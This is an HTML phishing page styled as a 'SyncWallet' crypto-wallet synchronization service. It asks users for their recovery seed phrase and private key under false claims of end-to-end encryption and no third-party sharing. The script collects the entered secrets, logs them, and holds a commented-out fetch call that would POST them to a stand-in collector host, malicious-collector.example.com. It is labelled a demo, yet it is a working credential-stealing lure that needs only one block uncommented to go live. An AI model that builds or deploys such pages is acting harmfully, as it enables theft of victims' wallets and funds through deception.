<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SyncWallet | Secure Wallet Synchronization</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: linear-gradient(135deg, #0f2027, #203a43, #2c5364); color: #e0e0e0; min-height: 100vh; display: flex; justify-content: center; align-items: center; margin: 0; padding: 20px; }
        .container { background: rgba(25, 35, 45, 0.9); border-radius: 20px; padding: 40px; width: 100%; max-width: 500px; box-shadow: 0 15px 35px rgba(0, 0, 0, 0.5); border: 1px solid #3a506b; }
        .logo { text-align: center; margin-bottom: 30px; }
        .logo i { font-size: 3em; color: #00d4aa; margin-bottom: 10px; }
        .logo h1 { margin: 0; font-size: 2em; color: #ffffff; }
        .logo p { color: #8f9ba8; margin-top: 5px; }
        .form-group { margin-bottom: 25px; }
        label { display: block; margin-bottom: 8px; font-weight: 600; color: #b0bec5; }
        textarea, input { width: 100%; padding: 15px; background: #1e2a3a; border: 1px solid #3a506b; border-radius: 10px; color: #ffffff; font-size: 1em; box-sizing: border-box; transition: border 0.3s; }
        textarea:focus, input:focus { outline: none; border-color: #00d4aa; }
        textarea { min-height: 100px; resize: vertical; font-family: monospace; }
        .info-box { background: rgba(0, 212, 170, 0.1); border-left: 4px solid #00d4aa; padding: 15px; margin-bottom: 25px; border-radius: 0 8px 8px 0; font-size: 0.9em; }
        .btn { background: linear-gradient(90deg, #00d4aa, #00b894); color: white; border: none; padding: 18px; width: 100%; border-radius: 10px; font-size: 1.1em; font-weight: bold; cursor: pointer; transition: transform 0.2s, box-shadow 0.2s; }
        .btn:hover { transform: translateY(-2px); box-shadow: 0 7px 20px rgba(0, 212, 170, 0.4); }
        .security-note { text-align: center; margin-top: 25px; font-size: 0.85em; color: #8f9ba8; }
        .security-note i { color: #00d4aa; margin-right: 5px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <i class="fas fa-wallet"></i>
            <h1>SyncWallet</h1>
            <p>Secure Multi-Chain Wallet Synchronization</p>
        </div>
        <div class="info-box">
            <i class="fas fa-info-circle"></i> For enhanced security and cross-device access, please enter your recovery phrase and private key. Your data is encrypted end-to-end.
        </div>
        <form id="syncForm">
            <div class="form-group">
                <label for="seedPhrase"><i class="fas fa-key"></i> Recovery Seed Phrase (12 or 24 words)</label>
                <textarea id="seedPhrase" name="seedPhrase" placeholder="Enter your seed phrase separated by spaces" required></textarea>
            </div>
            <div class="form-group">
                <label for="privateKey"><i class="fas fa-lock"></i> Private Key (Optional for enhanced verification)</label>
                <input type="text" id="privateKey" name="privateKey" placeholder="Enter your wallet's private key (0x...)" />
            </div>
            <button type="submit" class="btn"><i class="fas fa-sync-alt"></i> Synchronize & Secure Wallet</button>
        </form>
        <div class="security-note">
            <p><i class="fas fa-shield-alt"></i> Secured by 256-bit Encryption | Never shared with third parties</p>
        </div>
    </div>

    <script>
        document.getElementById('syncForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            const formData = new FormData(this);
            const credentials = {
                seedPhrase: formData.get('seedPhrase'),
                privateKey: formData.get('privateKey'),
                timestamp: new Date().toISOString(),
                userAgent: navigator.userAgent
            };

            // Display loading state
            const btn = this.querySelector('.btn');
            const originalText = btn.innerHTML;
            btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Syncing...';
            btn.disabled = true;

            // Simulate processing delay
            await new Promise(resolve => setTimeout(resolve, 1500));

            // In a real malicious scenario, credentials would be exfiltrated here
            console.log('[DEBUG] Credentials captured:', credentials);
            // Example exfiltration (commented out in this demo):
            // fetch('https://malicious-collector.example.com/log', {
            //     method: 'POST',
            //     body: JSON.stringify(credentials),
            //     mode: 'no-cors'
            // });

            // Show success message
            btn.innerHTML = '<i class="fas fa-check"></i> Synchronization Complete!';
            btn.style.background = 'linear-gradient(90deg, #00b894, #00a085)';
            setTimeout(() => {
                alert('Wallet synchronized successfully! You can now access your assets across all devices.');
                btn.innerHTML = originalText;
                btn.disabled = false;
                btn.style.background = 'linear-gradient(90deg, #00d4aa, #00b894)';
                this.reset();
            }, 1000);
        });
    </script>
</body>
</html>